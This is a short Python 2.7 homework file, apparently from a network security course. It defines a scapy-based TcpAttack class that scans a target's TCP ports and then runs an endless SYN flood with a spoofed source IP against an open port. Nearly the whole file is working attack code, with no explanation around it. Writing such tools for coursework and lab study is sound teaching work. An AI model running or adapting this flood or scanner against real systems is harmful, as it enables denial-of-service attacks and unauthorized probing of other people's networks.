#python2.7
#Homework Number: 8
#Name: Jiacheng Yuan
#ECN Login: yuan105
#Due Date: 3/20/2018

import socket
from scapy.all import *

class TcpAttack(object):
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []

    def scanTarget(self, rangeStart, rangeEnd):
        FILEOUT = open("openports.txt", 'w')

        # check for open port
        for test in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)

            try:
                sock.connect((self.targetIP, test))
                FILEOUT.write(str(test))
                FILEOUT.write(" ")
                self.open_ports.append(test)
            except Exception as e:
                pass

    def attackTarget(self, port):

        # check open port
        self.scanTarget(port, port)
        if port not in self.open_ports:
            print("Port not open")
            return

        #sending packet
        while(1):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)
        return
#if __name__ == '__main__':
    #t = TcpAttack("192.168.2.1", "192.168.2.5")
    #t.scanTarget(0, 1000)
    #t.attackTarget(22)